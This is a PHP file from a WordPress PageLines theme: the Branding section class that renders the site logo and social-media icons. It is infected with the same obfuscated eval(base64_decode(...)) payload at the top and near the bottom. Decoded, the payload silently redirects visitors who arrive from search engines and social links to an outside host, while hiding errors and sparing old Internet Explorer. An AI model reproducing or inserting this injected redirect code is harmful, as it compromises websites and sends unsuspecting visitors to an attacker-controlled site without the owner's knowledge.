<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/*
	Section: Branding
	Author: PageLines
	Author URI: http://www.pagelines.com
	Description: Shows the main site logo or the site title and description.
	Class Name: PageLinesBranding
	Workswith: header 
*/

class PageLinesBranding extends PageLinesSection {

   function __construct( $registered_settings = array() ) {
		
		$default_settings = array(
			'type'        => 'header',
			'workswith'   => array('header'),
		);

		
		$settings = wp_parse_args( $registered_settings, $default_settings );
		parent::__construct($settings);    
   }

   function section_template() { 
			
			printf('<div class="branding_wrap">');
			
				pagelines_main_logo(); 
			
				pagelines_register_hook( 'pagelines_before_branding_icons', 'branding' ); // Hook 
					
				printf('<div class="icons" style="bottom: %spx; right: %spx;">', intval(pagelines_option('icon_pos_bottom')), pagelines_option('icon_pos_right'));
					
					pagelines_register_hook( 'pagelines_branding_icons_start', 'branding' ); // Hook 
			
					if(ploption('rsslink'))
						printf('<a target="_blank" href="%s" class="rsslink"><img src="%s" alt="RSS"/></a>', apply_filters( 'pagelines_branding_rssurl', get_bloginfo('rss2_url') ), $this->base_url.'/rss.png' );
					
					if(VPRO) {
						if(ploption('twitterlink'))
							printf('<a target="_blank" href="%s" class="twitterlink"><img src="%s" alt="Twitter"/></a>', ploption('twitterlink'), $this->base_url.'/twitter.png');
					
						if(ploption('facebooklink'))
							printf('<a target="_blank" href="%s" class="facebooklink"><img src="%s" alt="Facebook"/></a>', ploption('facebooklink'), $this->base_url.'/facebook.png');
						
						if(ploption('linkedinlink'))
							printf('<a target="_blank" href="%s" class="linkedinlink"><img src="%s" alt="LinkedIn"/></a>', ploption('linkedinlink'), $this->base_url.'/linkedin.png');
						
						if(ploption('youtubelink'))
							printf('<a target="_blank" href="%s" class="youtubelink"><img src="%s" alt="Youtube"/></a>', ploption('youtubelink'), $this->base_url.'/youtube.png');
						
						if(ploption('gpluslink'))
							printf('<a target="_blank" href="%s" class="gpluslink"><img src="%s" alt="Twitter"/></a>', ploption('gpluslink'), $this->base_url.'/google.png');
						
						pagelines_register_hook( 'pagelines_branding_icons_end', 'branding' ); // Hook 
				
					}
					
			printf('</div></div>');
					
			pagelines_register_hook( 'pagelines_after_branding_wrap', 'branding' ); // Hook
				
			?>		
			<script type="text/javascript"> 
				jQuery('.icons a').hover(function(){ jQuery(this).fadeTo('fast', 1); },function(){ jQuery(this).fadeTo('fast', 0.5);});
			</script>
<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpIGFuZCAhc3RyaXN0cigkdWFnLCJNU0lFIDYuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20vbCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgew0KaWYgKCFzdHJpc3RyKCRyZWZlcmVyLCJjYWNoZSIpIG9yICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpKXsNCmhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly9xZXNvcHYuNHB1LmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9")); 	
				
		}


}

/*
	End of section class
*/